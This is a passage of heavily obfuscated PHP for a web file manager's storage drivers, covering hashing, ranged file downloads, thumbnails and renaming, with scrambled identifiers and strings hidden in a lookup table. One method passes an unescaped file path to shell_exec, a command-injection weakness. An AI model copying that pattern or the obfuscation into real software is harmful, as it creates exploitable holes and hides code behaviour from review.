$ı–Æş«×) { return $this->hashMd5($ã’¾ÊüË) . $…ÄÈ¥­ê; } $£Òèšû = intval($…ÄÈ¥­ê / $ı–Æş«×); $ïÉ¯•Êˆ = $òÉ­Ç‹[12]; for ($Ìª¬¯õÍ = 0; $Ìª¬¯õÍ < $ı–Æş«×; $Ìª¬¯õÍ++) { $ïÉ¯•Êˆ .= $this->fileSubstr($ã’¾ÊüË, $£Òèšû * $Ìª¬¯õÍ, $õª‚’İÚ); } $ïÉ¯•Êˆ .= $this->fileSubstr($ã’¾ÊüË, $…ÄÈ¥­ê - $õª‚’İÚ, $õª‚’İÚ); return md5($ïÉ¯•Êˆ) . $…ÄÈ¥­ê; } public static $md5Cache = array(); public function hashMd5($çúş•Æ¯) { if (!$çúş•Æ¯) { return md5($_SERVER[áäÒ½¯Ç][12]); } $çúş•Æ¯ = $this->iconvSystem($çúş•Æ¯); if (isset(self::$md5Cache[$çúş•Æ¯])) { return self::$md5Cache[$çúş•Æ¯]; } self::$md5Cache[$çúş•Æ¯] = $this->hashMd5Shell($çúş•Æ¯); if (!self::$md5Cache[$çúş•Æ¯]) { self::$md5Cache[$çúş•Æ¯] = @md5_file($çúş•Æ¯); } return self::$md5Cache[$çúş•Æ¯]; } private function hashMd5Shell($Ù‘‚¾½¹) { $»´¬­ÀÖ =& $_SERVER[áäÒ½¯Ç]; if (!$Ù‘‚¾½¹) { return md5($»´¬­ÀÖ[12]); } if (!function_exists($»´¬­ÀÖ[99])) { return !1; } $é´—²³ = array($»´¬­ÀÖ[100], $»´¬­ÀÖ[101]); $«‘ì†Ÿ— = Cache::get($»´¬­ÀÖ[102]); if (!$«‘ì†Ÿ—) { $¬©Ü¡ü´ = BASIC_PATH . $»´¬­ÀÖ[103]; $êÀ§åüß = md5_file($¬©Ü¡ü´); $«‘ì†Ÿ— = $»´¬­ÀÖ[104]; foreach ($é´—²³ as $È†±Ñ²ˆ) { $ê¼ë”û  = shell_exec($È†±Ñ²ˆ . "\40\x22{$¬©Ü¡ü´}\x22"); if ($ê¼ë”û  && substr(trim($ê¼ë”û ), 0, 32) == $êÀ§åüß) { $«‘ì†Ÿ— = $È†±Ñ²ˆ; break; } } Cache::set($»´¬­ÀÖ[102], $«‘ì†Ÿ—, 3600); } if ($«‘ì†Ÿ— == $»´¬­ÀÖ[104]) { return !1; } $ê¼ë”û  = shell_exec($«‘ì†Ÿ— . "\x20\x22{$Ù‘‚¾½¹}\x22"); $ê¼ë”û  = str_replace($»´¬­ÀÖ[105], $»´¬­ÀÖ[12], $ê¼ë”û ); return substr($ê¼ë”û , 0, 32); } public function link($¾“ÊÎƒò) { return $¾“ÊÎƒò; } public function fileOut($ü¢ã¡ñ, $€ÈâÑ´ = false, $“‘¶â–« = false, $çŞì€¥ = '') { $¸ú®¤òÖ =& $_SERVER[áäÒ½¯Ç]; $this->cacheMethod(null, null); if (!$ü¢ã¡ñ || !$this->exist($ü¢ã¡ñ)) { show_json(LNG($¸ú®¤òÖ[106]), !1, $“‘¶â–«); } $‰“à¨Ü³ = $this->getType() == $¸ú®¤òÖ[107]; $ŠÚ§€  = $GLOBALS[$¸ú®¤òÖ[6]][$¸ú®¤òÖ[92]][$¸ú®¤òÖ[108]][$¸ú®¤òÖ[109]]; $¢º¢›òµ = (double) $GLOBALS[$¸ú®¤òÖ[6]][$¸ú®¤òÖ[92]][$¸ú®¤òÖ[108]][$¸ú®¤òÖ[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $í¾´“é = $this->infoFull($ü¢ã¡ñ); $ÉÚ‘–š = $í¾´“é[$¸ú®¤òÖ[79]]; $´ˆİĞ™ = gmdate($¸ú®¤òÖ[111], $í¾´“é[$¸ú®¤òÖ[88]]); $şš™Û¤ë = $“‘¶â–« ? $“‘¶â–« : $this->iconvApp($í¾´“é[$¸ú®¤òÖ[32]]); $ôË×ËÂ = 0; $ğ³·¼»— = $ÉÚ‘–š - 1; $ó“÷ˆºÙ = $this->ext($şš™Û¤ë); if (in_array($ó“÷ˆºÙ, array($¸ú®¤òÖ[112], $¸ú®¤òÖ[113], $¸ú®¤òÖ[114], $¸ú®¤òÖ[115]))) { $ó“÷ˆºÙ = $¸ú®¤òÖ[116]; } if (in_array($ó“÷ˆºÙ, array($¸ú®¤òÖ[117]))) { $ó“÷ˆºÙ = $¸ú®¤òÖ[118]; } if (!$çŞì€¥) { $çŞì€¥ = md5($´ˆİĞ™ . $ÉÚ‘–š); } $çŞì€¥ = $¸ú®¤òÖ[119] . $çŞì€¥ . $¸ú®¤òÖ[119]; $ÔÚÈäÛ = get_file_mime($ó“÷ˆºÙ); $àó·€ƒ¥ = !0; $àó·€ƒ¥ = isset($_GET[$¸ú®¤òÖ[120]]) ? !1 : !0; if ($€ÈâÑ´ === !1 && !mime_support($ÔÚÈäÛ)) { $ÔÚÈäÛ = $¸ú®¤òÖ[121]; } header($¸ú®¤òÖ[122]); header($¸ú®¤òÖ[123] . $ÔÚÈäÛ); $©©ò—îğ = rawurlencode($şš™Û¤ë); $©©ò—îğ = $¸ú®¤òÖ[119] . $©©ò—îğ . $¸ú®¤òÖ[124] . $©©ò—îğ; if ($€ÈâÑ´) { header($¸ú®¤òÖ[125]); header($¸ú®¤òÖ[126] . $©©ò—îğ); } else { if ($àó·€ƒ¥) { header($¸ú®¤òÖ[127] . $©©ò—îğ); } } $†Î„æ š = 3600 * 24 * 30; header($¸ú®¤òÖ[128]); header($¸ú®¤òÖ[129]); header($¸ú®¤òÖ[130] . $†Î„æ š); header($¸ú®¤òÖ[131] . gmdate($¸ú®¤òÖ[111], time() + $†Î„æ š) . $¸ú®¤òÖ[132]); if (isset($_SERVER[$¸ú®¤òÖ[133]]) && strtotime($_SERVER[$¸ú®¤òÖ[133]]) == $í¾´“é[$¸ú®¤òÖ[88]]) { header($¸ú®¤òÖ[134], !0, 304); die; } if (isset($_SERVER[$¸ú®¤òÖ[135]]) && $_SERVER[$¸ú®¤òÖ[135]] == $çŞì€¥) { header($¸ú®¤òÖ[136] . $çŞì€¥, !0, 304); die; } header($¸ú®¤òÖ[136] . $çŞì€¥); header($¸ú®¤òÖ[137] . $´ˆİĞ™ . $¸ú®¤òÖ[132]); header($¸ú®¤òÖ[138] . rawurlencode($şš™Û¤ë)); header($¸ú®¤òÖ[139]); header($¸ú®¤òÖ[140] . $ÉÚ‘–š); header($¸ú®¤òÖ[141]); Hook::trigger($¸ú®¤òÖ[142], $ü¢ã¡ñ, $ÉÚ‘–š, $şš™Û¤ë, $ó“÷ˆºÙ); if (!$€ÈâÑ´ && $ó“÷ˆºÙ == $¸ú®¤òÖ[143]) { if ($ÉÚ‘–š > 1024 * 1024 * 10) { die; } $Æä‡ÔßÀ = $this->getContent($ü¢ã¡ñ); $Æä‡ÔßÀ = Html::clearSVG($Æä‡ÔßÀ); header($¸ú®¤òÖ[144] . strlen($Æä‡ÔßÀ)); echo $Æä‡ÔßÀ; die; } $®‰´áÄ˜ = strtolower($_SERVER[$¸ú®¤òÖ[145]]); if ($‰“à¨Ü³ && $®‰´áÄ˜ && $ŠÚ§€ ) { if (strstr($®‰´áÄ˜, $¸ú®¤òÖ[146])) { header($¸ú®¤òÖ[147] . $ü¢ã¡ñ); } else { if (strstr($®‰´áÄ˜, $¸ú®¤òÖ[148])) { header($¸ú®¤òÖ[149] . $ü¢ã¡ñ); } else { if (strstr($®‰´áÄ˜, $¸ú®¤òÖ[150])) { header($¸ú®¤òÖ[151] . $ü¢ã¡ñ); } } } if ($¢º¢›òµ) { header($¸ú®¤òÖ[152] . $¢º¢›òµ); } return; } if (isset($_SERVER[$¸ú®¤òÖ[153]])) { if (preg_match($¸ú®¤òÖ[154], $_SERVER[$¸ú®¤òÖ[153]], $Ä¸ó¥óÄ)) { $ôË×ËÂ = intval($Ä¸ó¥óÄ[1]); $ôË×ËÂ = $ôË×ËÂ <= 0 ? 0 : ($ôË×ËÂ >= $ğ³·¼»— ? $ğ³·¼»— : $ôË×ËÂ); if (!empty($Ä¸ó¥óÄ[2])) { $¡‡š‹®‚ = intval($Ä¸ó¥óÄ[2]); $ğ³·¼»— = $¡‡š‹®‚ < $ôË×ËÂ ? $ôË×ËÂ : ($¡‡š‹®‚ >= $ğ³·¼»— ? $ğ³·¼»— : $¡‡š‹®‚); } } header($¸ú®¤òÖ[155]); header("\103\157\156\x74\145\x6e\164\x2d\122\141\x6e\147\x65\72\x20\142\x79\x74\145\x73\x20{$ôË×ËÂ}\x2d{$ğ³·¼»—}\57" . $ÉÚ‘–š); } else { header($¸ú®¤òÖ[156]); } header($¸ú®¤òÖ[157]); header($¸ú®¤òÖ[158]); $–îÔÚÒ¡ = !0; if ($_SERVER[$¸ú®¤òÖ[159]] == $¸ú®¤òÖ[160] && $ÉÚ‘–š > 1204 * 1024 * 1024 * 2) { $–îÔÚÒ¡ = !1; } if ($–îÔÚÒ¡) { header($¸ú®¤òÖ[161] . ($ğ³·¼»— - $ôË×ËÂ + 1)); } if ($_SERVER[$¸ú®¤òÖ[162]] == $¸ú®¤òÖ[163]) { return; } $åŞÁÑµ¨ = array($¸ú®¤òÖ[164] => !1, $¸ú®¤òÖ[165] => $ôË×ËÂ, $¸ú®¤òÖ[166] => $ğ³·¼»—, $¸ú®¤òÖ[167] => $ó“÷ˆºÙ, $¸ú®¤òÖ[168] => $í¾´“é, $¸ú®¤òÖ[169] => $¸ú®¤òÖ[12], $¸ú®¤òÖ[170] => 0); $åŞÁÑµ¨ = Hook::filter($¸ú®¤òÖ[171], $åŞÁÑµ¨); $×¨º±“ = 1024 * 300; $¹…õ’¾‡ = 0; if ($¢º¢›òµ) { $¹…õ’¾‡ = intval(1000 * 1000 * ($×¨º±“ / $¢º¢›òµ)); } while ($ôË×ËÂ <= $ğ³·¼»—) { $ö­Ë¤ı¤ = timeFloat(); check_abort(); $¥ö¸‘¿ó = $ğ³·¼»— - $ôË×ËÂ + 1; if ($¥ö¸‘¿ó <= $×¨º±“) { $×¨º±“ = $¥ö¸‘¿ó; } $Æä‡ÔßÀ = $this->fileSubstr($ü¢ã¡ñ, $ôË×ËÂ, $×¨º±“); if ($åŞÁÑµ¨[$¸ú®¤òÖ[164]]) { $åŞÁÑµ¨[$¸ú®¤òÖ[169]] = $Æä‡ÔßÀ; $åŞÁÑµ¨[$¸ú®¤òÖ[170]] = $ôË×ËÂ; $åŞÁÑµ¨ = Hook::filter($¸ú®¤òÖ[172], $åŞÁÑµ¨); $Æä‡ÔßÀ = $åŞÁÑµ¨[$¸ú®¤òÖ[169]]; } echo $Æä‡ÔßÀ; $ôË×ËÂ += $×¨º±“; if ($×¨º±“ == $¥ö¸‘¿ó) { $ôË×ËÂ = $ğ³·¼»— + 1; } if ($¹…õ’¾‡) { $Ğ·ª¥…é = intval(1000 * 1000 * (timeFloat() - $ö­Ë¤ı¤)); $ÈÑÄû‘Á = $¹…õ’¾‡ - $Ğ·ª¥…é; if ($ÈÑÄû‘Á > 5) { usleep($ÈÑÄû‘Á); } } } } public function fileOutServer($û£Ë¦ä¡, $“¢—ÁË³ = false, $º«·˜å = false, $‘íÉ«¥´ = '') { $this->fileOut($û£Ë¦ä¡, $“¢—ÁË³, $º«·˜å, $‘íÉ«¥´); } public function fileOutLink($È€¥†) { header($_SERVER[áäÒ½¯Ç][173] . $È€¥†); die; } public function cacheMethod($¨ú¤ñóé, $‡¢Îº¹, $ıêªü = null) { $÷çÔÙ™ =& $_SERVER[áäÒ½¯Ç]; static $äŸ°ÒÛµ = array(); $çï¼Æßğ = $‡¢Îº¹ ? ltrim($this->getPathOuter($‡¢Îº¹), $÷çÔÙ™[8]) : $÷çÔÙ™[12]; $ıŠâ³•ç = $÷çÔÙ™[174] . $¨ú¤ñóé . $÷çÔÙ™[175] . rtrim($çï¼Æßğ, $÷çÔÙ™[8]); if (is_null($¨ú¤ñóé)) { $äŸ°ÒÛµ = array(); return; } if (is_null($‡¢Îº¹)) { foreach ($äŸ°ÒÛµ as $ıŠâ³•ç => $³¦³û¨) { if (!strstr($ıŠâ³•ç, $÷çÔÙ™[174] . $¨ú¤ñóé . $÷çÔÙ™[176])) { continue; } unset($äŸ°ÒÛµ[$ıŠâ³•ç]); } return; } if ($ıêªü === $÷çÔÙ™[177]) { unset($äŸ°ÒÛµ[$ıŠâ³•ç]); return; } if (!is_null($ıêªü)) { $äŸ°ÒÛµ[$ıŠâ³•ç] = $ıêªü; return; } $µÍ…œ¤¯ = isset($äŸ°ÒÛµ[$ıŠâ³•ç]) ? $äŸ°ÒÛµ[$ıŠâ³•ç] : null; if (!is_null($µÍ…œ¤¯)) { return $µÍ…œ¤¯; } $µÍ…œ¤¯ = $this->{$¨ú¤ñóé}($‡¢Îº¹); $äŸ°ÒÛµ[$ıŠâ³•ç] = $µÍ…œ¤¯; return $µÍ…œ¤¯; } public function cacheMethodInfoSet($¶í‰ÍŒš, $‚»İ€, $Îâ¹ñ = false) { $Ğ§­ëÕ =& $_SERVER[áäÒ½¯Ç]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ğ§­ëÕ[178], $¶í‰ÍŒš, $‚»İ€); $this->cacheMethod($Ğ§­ëÕ[179], $¶í‰ÍŒš, $‚»İ€ ? !1 : !0); if (is_array($Îâ¹ñ)) { $this->cacheMethod($Ğ§­ëÕ[180], $¶í‰ÍŒš, $Îâ¹ñ); } } public function fileOutImage($¾“„Ôô¹, $Ö×Šİæ = 250) { $ˆçÈ„øü =& $_SERVER[áäÒ½¯Ç]; set_timeout(); if (substr($¾“„Ôô¹, 0, 4) == $ˆçÈ„øü[150]) { $this->fileOutLink($¾“„Ôô¹); } $×øùš÷¯ = $this->info($¾“„Ôô¹); $ˆ–¹’ = !1; $€‹ŸÔ”ì = isset($GLOBALS[$ˆçÈ„øü[181]]) ? $GLOBALS[$ˆçÈ„øü[181]] : array(); if ($€‹ŸÔ”ì && $€‹ŸÔ”ì[$ˆçÈ„øü[182]] == $×øùš÷¯[$ˆçÈ„øü[87]]) { $×øùš÷¯ = $€‹ŸÔ”ì; $¾ïÓ¨ä‚ = $×øùš÷¯[$ˆçÈ„øü[183]]; if ($¾ïÓ¨ä‚ && isset($¾ïÓ¨ä‚[$ˆçÈ„øü[184]])) { if ($¾ïÓ¨ä‚[$ˆçÈ„øü[184]] <= $Ö×Šİæ && $¾ïÓ¨ä‚[$ˆçÈ„øü[185]] <= $Ö×Šİæ) { $ˆ–¹’ = !0; } } } if ($×øùš÷¯[$ˆçÈ„øü[79]] <= 1024 * 50 || $ˆ–¹’ || !function_exists($ˆçÈ„øü[186]) || $×øùš÷¯[$ˆçÈ„øü[167]] == $ˆçÈ„øü[187]) { return $this->fileOut($¾“„Ôô¹, !1, $×øùš÷¯[$ˆçÈ„øü[32]]); } $‰ÉÜÔËƒ = kodIO::hashPath($×øùš÷¯); $À´°šÔÏ = "\x63\x6f\x76\145\162\x5f{$‰ÉÜÔËƒ}\137{$Ö×Šİæ}\x2e\160\x6e\147"; $„İØ„ÏÆ = IO_PATH_SYSTEM_TEMP . $ˆçÈ„øü[188]; $°í—ıÃå = IO::infoFullSimple($„İØ„ÏÆ); $øÂ¯±—Ş = $°í—ıÃå && is_array($°í—ıÃå) ? $°í—ıÃå[$ˆçÈ„øü[87]] : $ˆçÈ„øü[12]; if (!$øÂ¯±—Ş) { $øÂ¯±—Ş = IO::mkdir($„İØ„ÏÆ); } if ($×øùš÷¯[$ˆçÈ„øü[189]] == $ˆçÈ„øü[190] && isset($×øùš÷¯[$ˆçÈ„øü[191]]) && $×øùš÷¯[$ˆçÈ„øü[191]] == kodIO::sourceID($øÂ¯±—Ş)) { $Çé†›‹’ = $×øùš÷¯[$ˆçÈ„øü[192]]; if ($Ö×Šİæ <= 500) { $Ú¾³“‚ = preg_replace($ˆçÈ„øü[193], $ˆçÈ„øü[194], $×øùš÷¯[$ˆçÈ„øü[32]]); $Çé†›‹’ = IO::fileNameExist($øÂ¯±—Ş, $Ú¾³“‚); } return IO::fileOut(KodIO::make($Çé†›‹’), !1, $×øùš÷¯[$ˆçÈ„øü[32]]); } $«£æ‰Çã = IO::fileNameExist($øÂ¯±—Ş, $À´°šÔÏ); if ($«£æ‰Çã) { return IO::fileOut(KodIO::make($«£æ‰Çã), !1, $×øùš÷¯[$ˆçÈ„øü[32]]); } if ($Ö×Šİæ > 1000) { $this->makeImageCover($øÂ¯±—Ş, $¾“„Ôô¹, $À´°šÔÏ, $Ö×Šİæ); $this->makeImageCover($øÂ¯±—Ş, $¾“„Ôô¹, "\143\x6f\166\145\x72\137{$‰ÉÜÔËƒ}\x5f\x32\65\x30\56\x70\156\x67", 250); $«£æ‰Çã = IO::fileNameExist($øÂ¯±—Ş, $À´°šÔÏ); if ($«£æ‰Çã) { return IO::fileOut(KodIO::make($«£æ‰Çã), !1, $×øùš÷¯[$ˆçÈ„øü[32]]); } die; } if (!kodIO::allowCover($×øùš÷¯)) { return $this->fileOut($¾“„Ôô¹, !1, $×øùš÷¯[$ˆçÈ„øü[32]]); } $µâªâ’á = Cache::get($À´°šÔÏ); if ($µâªâ’á == $ˆçÈ„øü[195] || $µâªâ’á == $ˆçÈ„øü[196]) { echo $µâªâ’á; die; } Cache::set($À´°šÔÏ, $ˆçÈ„øü[196], 60); $·¥Ïºóˆ = array($øÂ¯±—Ş, $×øùš÷¯[$ˆçÈ„øü[87]], $À´°šÔÏ, $Ö×Šİæ); $É“ÕÇú = $ˆçÈ„øü[197] . $×øùš÷¯[$ˆçÈ„øü[79]] . $ˆçÈ„øü[198] . $À´°šÔÏ . $ˆçÈ„øü[199] . $×øùš÷¯[$ˆçÈ„øü[32]] . $ˆçÈ„øü[200] . $×øùš÷¯[$ˆçÈ„øü[87]]; TaskQueue::add($ˆçÈ„øü[201], $·¥Ïºóˆ, $É“ÕÇú, $À´°šÔÏ); } public function makeImageCover($×‚£î˜·, $Èâæ©µê, $Ü‘Şøôƒ, $úé±îİ«) { $­úüÊÕ§ =& $_SERVER[áäÒ½¯Ç]; if (IO::fileNameExist($×‚£î˜·, $Ü‘Şøôƒ)) { return $­úüÊÕ§[202]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $§¶†¶º = $this->getPathOuter($Èâæ©µê); $äÂàñšà = DATA_THUMB . $Ü‘Şøôƒ; del_file($äÂàñšà); $ş³­Â°ã = IO::copy($§¶†¶º, TEMP_FILES, !1, $Ü‘Şøôƒ); if (!@file_exists($ş³­Â°ã)) { return $­úüÊÕ§[203]; } ImageThumb::createThumb($ş³­Â°ã, $äÂàñšà, $úé±îİ«, $úé±îİ« * 10); if (@file_exists($äÂàñšà)) { Cache::remove($Ü‘Şøôƒ); return IO::move($äÂàñšà, $×‚£î˜·); } Cache::set($Ü‘Şøôƒ, $­úüÊÕ§[195], 600); del_file($äÂàñšà); return $­úüÊÕ§[204] . $ş³­Â°ã . $­úüÊÕ§[74]; } public function fileOutImageServer($€àîì±Ó, $øÙÙ»Àë = 250) { $this->fileOutImage($€àîì±Ó, $øÙÙ»Àë); } public function fileNameAuto($ı«Î’½è, $±¢ªá¦Û, $‹ˆ«ÇêË = REPEAT_RENAME, $ŸÕØ„Ú¸ = false) { $áõÊ·’Õ =& $_SERVER[áäÒ½¯Ç]; $¿„õÎƒÄ = $ı«Î’½è === $áõÊ·’Õ[12] ? $±¢ªá¦Û : rtrim($ı«Î’½è, $áõÊ·’Õ[8]) . $áõÊ·’Õ[8] . $±¢ªá¦Û; if ($‹ˆ«ÇêË == REPEAT_REPLACE || !$this->exist($¿„õÎƒÄ) || $ŸÕØ„Ú¸ && $‹ˆ«ÇêË != REPEAT_RENAME_FOLDER) { return $±¢ªá¦Û; } if ($‹ˆ«ÇêË == REPEAT_SKIP) { return !1; } $Õª“ú¾ô = $áõÊ·’Õ[10] . get_path_ext($±¢ªá¦Û); $Õª“ú¾ô = $Õª“ú¾ô == $áõÊ·’Õ[10] || $ŸÕØ„Ú¸ ? $áõÊ·’Õ[12] : $Õª“ú¾ô; $Âà‰»©œ = 1; $İçÒ­µ² = substr($±¢ªá¦Û, 0, strlen($±¢ªá¦Û) - strlen($Õª“ú¾ô)); $Ğ…©€Ï = $İçÒ­µ² . "\x28{$Âà‰»©œ}\51{$Õª“ú¾ô}"; while ($this->exist(rtrim($ı«Î’½è, $áõÊ·’Õ[8]) . $áõÊ·’Õ[8] . $Ğ…©€Ï)) { $Ğ…©€Ï = $İçÒ­µ² . "\x28{$Âà‰»©œ}\51{$Õª“ú¾ô}"; $Âà‰»©œ++; } return $Ğ…©€Ï; } private function fileNameAutoList($é¸ÎÖö, $µ½ıƒù, $¢‘èÅ„Ã = false) { $¡Ã†µÍ« =& $_SERVER[áäÒ½¯Ç]; $“˜ë…·Î = $this->listPath($é¸ÎÖö, !0); $“˜ë…·Î = array_merge($“˜ë…·Î[$¡Ã†µÍ«[85]], $“˜ë…·Î[$¡Ã†µÍ«[86]]); $şº÷ÁÃ‘ = array_to_keyvalue($“˜ë…·Î, $¡Ã†µÍ«[12], $¡Ã†µÍ«[32]); $¡‘œ³° = $¡Ã†µÍ«[10] . get_path_ext($µ½ıƒù); $¡‘œ³° = $¡‘œ³° == $¡Ã†µÍ«[10] || $¢‘èÅ„Ã ? $¡Ã†µÍ«[12] : $¡‘œ³°; $ÅÏ©³‘ù = substr($µ½ıƒù, 0, strlen($µ½ıƒù) - strlen($¡‘œ³°)); $“áê³×ı = $ÅÏ©³‘ù . "\x28\x30\51{$¡‘œ³°}"; for ($ñÛé—°ä = 1; $ñÛé—°ä <= count($şº÷ÁÃ‘) + 1; $ñÛé—°ä++) { $“áê³×ı = $ÅÏ©³‘ù . "\50{$ñÛé—°ä}\x29{$¡‘œ³°}"; if (!in_array_not_case($“áê³×ı, $şº÷ÁÃ‘)) { return $“áê³×ı; } } return $“áê³×ı; } public function listAllFiles($ŒûÉ…øô, $¬…Ï¤’ò) { $Â¶·òö° =& $_SERVER[áäÒ½¯Ç]; if (empty($¬…Ï¤’ò)) { return array(); } $éÛÍñç = array_keys($¬…Ï¤’ò); $Ëğ¦‹ò = array(); $ŒûÉ…øô = trim($ŒûÉ…øô, $Â¶·òö°[8]); foreach ($¬…Ï¤’ò as $É¢ñ‚¿ø => $¿ì‡¬…) { $¼Ô™µ» = ltrim(substr(trim($É¢ñ‚¿ø, $Â¶·òö°[8]), strlen($ŒûÉ…øô)), $Â¶·òö°[8]); if (substr($É¢ñ‚¿ø, -1) == $Â¶·òö°[8]) { $¼Ô™µ» = rtrim($¼Ô™µ», $Â¶·òö°[8]) . $Â¶·òö°[8]; } $Ëğ¦‹ò = array_merge($Ëğ¦‹ò, $this->slicePath($¼Ô™µ»)); } $ÛÅõì› = array(); foreach (array_unique($Ëğ¦‹ò) as $ó§Ÿï) { $ªòº­µé = array($Â¶·òö°[87] => $this->getPathOuter($Â¶·òö°[8] . $ŒûÉ…øô . $Â¶·òö°[8] . $ó§Ÿï), $Â¶·òö°[78] => 1, $Â¶·òö°[79] => 0); if (substr($ó§Ÿï, -1) != $Â¶·òö°[8]) { $ªòº­µé[$Â¶·òö°[78]] = 0; $´ú ÷®… = $this->getPath($ŒûÉ…øô . $Â¶·òö°[8] . $ó§Ÿï); if (isset($¬…Ï¤’ò[$´ú ÷®…])) { $ÉÛ“İ = $¬…Ï¤’ò[$´ú ÷®…]; if (isset($ÉÛ“İ[$Â¶·òö°[79]])) { $ªòº­µé[$Â¶·òö°[79]] = intval($ÉÛ“İ[$Â¶·òö°[79]]); } if (isset($ÉÛ“İ[$Â¶·òö°[205]])) { $ªòº­µé[$Â¶·òö°[88]] = intval($ÉÛ“İ[$Â¶·òö°[205]]); } } } $ÛÅõì›[] = $ªòº­µé; } return $ÛÅõì›; } public function slicePath($ÅÀË×) { $Š·Ñ‚ö =& $_SERVER[áäÒ½¯Ç]; $¸ù¾ÎŸÆ = explode($Š·Ñ‚ö[8], trim($ÅÀË×, $Š·Ñ‚ö[8])); $àüƒ¯™ = 0; do { ++$àüƒ¯™; $ÛŞ½¬ŠŒ[] = implode($Š·Ñ‚ö[8], array_slice($¸ù¾ÎŸÆ, 0, $àüƒ¯™)) . $Š·Ñ‚ö[8]; } while ($àüƒ¯™ < count($¸ù¾ÎŸÆ)); $ÛŞ½¬ŠŒ[count($¸ù¾ÎŸÆ) - 1] = $ÅÀË×; return $ÛŞ½¬ŠŒ; } public function getHost() { $ı‰Ù¨û =& $_SERVER[áäÒ½¯Ç]; $Ü¹ŸÆ‚ = parse_url(trim($this->domain, $ı‰Ù¨û[8])); $Ÿâ²Šå = isset($Ü¹ŸÆ‚[$ı‰Ù¨û[206]]) ? $Ü¹ŸÆ‚[$ı‰Ù¨û[206]] : http_type(); $ê½»™ø‰ = isset($Ü¹ŸÆ‚[$ı‰Ù¨û[207]]) ? $Ü¹ŸÆ‚[$ı‰Ù¨û[207]] : $Ü¹ŸÆ‚[$ı‰Ù¨û[87]]; if (isset($Ü¹ŸÆ‚[$ı‰Ù¨û[208]])) { $ê½»™ø‰ .= $ı‰Ù¨û[4] . $Ü¹ŸÆ‚[$ı‰Ù¨û[208]]; } return $Ÿâ²Šå . $ı‰Ù¨û[209] . $ê½»™ø‰; } public function pathEncode($‹°´ÆÙÀ) { $ç°ÈçŸ =& $_SERVER[áäÒ½¯Ç]; return str_replace($ç°ÈçŸ[210], $ç°ÈçŸ[8], rawurlencode($‹°´ÆÙÀ)); } public function writeLog($ñï’”‹À = '', $£Çì‚äÑ = false) { $İÁö  =& $_SERVER[áäÒ½¯Ç]; $•ˆ‡úş¤ = in_array(ACTION, array($İÁö [211], $İÁö [212])); if (!$•ˆ‡úş¤ && !GLOBAL_DEBUG) { return; } $î±¢¯û½ = $ñï’”‹À; static $Ì²¦ô¶ = null; if (!$Ì²¦ô¶) { $Ì²¦ô¶ = strtoupper($this->getType()); } $ñï’”‹À = $Ì²¦ô¶ . $İÁö [213] . $ñï’”‹À; if ($£Çì‚äÑ) { $½İ¿ÖÎ = error_get_last(); if ($½İ¿ÖÎ) { $ñï’”‹À = array($ñï’”‹À, $½İ¿ÖÎ); } } write_log($ñï’”‹À, $İÁö [214]); if ($•ˆ‡úş¤) { throw new Exception($î±¢¯û½); } } } $_file = $_SERVER[$_SERVER[áäÒ½¯Ç][215]]; $_size = $_SERVER[áäÒ½¯Ç][216]; goto DÓË•©»ª¢; D¬­Ò§ïŸÄ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¿¶Ä­šÔ = false) { } public function exist($Ï¯±Ê‡Å) { $ã¶÷Üê× = $this->info($Ï¯±Ê‡Å); return $ã¶÷Üê×[$_SERVER[áäÒ½¯Ç][243]]; } public function isFile($©è£ô) { $ÏŸ’øÓƒ = $this->info($©è£ô); return $ÏŸ’øÓƒ[$_SERVER[áäÒ½¯Ç][243]]; } public function isFolder($®Ğ³Ûªİ) { return !1; } public function size($À£ì®ùğ) { $íÒí™®ş = $this->info($À£ì®ùğ); return $íÒí™®ş[$_SERVER[áäÒ½¯Ç][79]]; } public function info($÷ó³ÙÃ) { return $this->infoParse($÷ó³ÙÃ); } public function infoAuth($ªÍüÚ–‘) { return $this->infoParse($ªÍüÚ–‘); } public function infoWithChildren($ù…ë´úö) { return $this->infoParse($ù…ë´úö); } public function infoFull($Ä»½î†) { return $this->infoParse($Ä»½î†); } private function infoParse($ŸËıİÊ–) { $•ÖŞõ×” =& $_SERVER[áäÒ½¯Ç]; $ªÅöáŒº = $this->header($ŸËıİÊ–); if (!$ªÅöáŒº || !$ªÅöáŒº[$•ÖŞõ×”[852]]) { return !1; } $Ì¥Æëä‹ = _get($ªÅöáŒº, $•ÖŞõ×”[422], 0); $ÍÚÊ©äö = array($•ÖŞõ×”[32] => $ªÅöáŒº[$•ÖŞõ×”[32]], $•ÖŞõ×”[87] => $ŸËıİÊ–, $•ÖŞõ×”[33] => $•ÖŞõ×”[241], $•ÖŞõ×”[79] => intval($Ì¥Æëä‹), $•ÖŞõ×”[167] => get_path_ext($ªÅöáŒº[$•ÖŞõ×”[32]]), $•ÖŞõ×”[1612] => $Ì¥Æëä‹ > 0 && $ªÅöáŒº[$•ÖŞõ×”[1758]], $•ÖŞõ×”[1613] => !1); return $ÍÚÊ©äö; } private function header($ÄÀ¥Æµ…) { $¼§ÎŒÉ‘ =& $_SERVER[áäÒ½¯Ç]; if (isset(self::$_cacheHeader[$ÄÀ¥Æµ…])) { return self::$_cacheHeader[$ÄÀ¥Æµ…]; } $õãèÌğ’ = isset($GLOBALS[$¼§ÎŒÉ‘[1759]]) ? $GLOBALS[$¼§ÎŒÉ‘[1759]] : !1; $GLOBALS[$¼§ÎŒÉ‘[1759]] = !0; self::$_cacheHeader[$ÄÀ¥Æµ…] = url_header($ÄÀ¥Æµ…); $GLOBALS[$¼§ÎŒÉ‘[1759]] = $õãèÌğ’; return self::$_cacheHeader[$ÄÀ¥Æµ…]; } public function hashSimple($Ş‚ÏáÉƒ, $ç••˜µ² = false) { $Ò†ÌòÖÎ =& $_SERVER[áäÒ½¯Ç]; $·‡œ²Ğâ = $this->info($Ş‚ÏáÉƒ); if (!$·‡œ²Ğâ || !$·‡œ²Ğâ[$Ò†ÌòÖÎ[243]]) { return !1; } $¿Ôæ™‡… = $·‡œ²Ğâ[$Ò†ÌòÖÎ[79]]; $” Ä³»Œ = 200; $”•»ÚÊß = 50; if ($¿Ôæ™‡… <= $” Ä³»Œ * $”•»ÚÊß) { return md5($this->fileSubstr($Ş‚ÏáÉƒ, 0, $¿Ôæ™‡…)) . $¿Ôæ™‡…; } $³Óµô½¥ = intval($¿Ôæ™‡… / $”•»ÚÊß); $†§¾¸¤ = 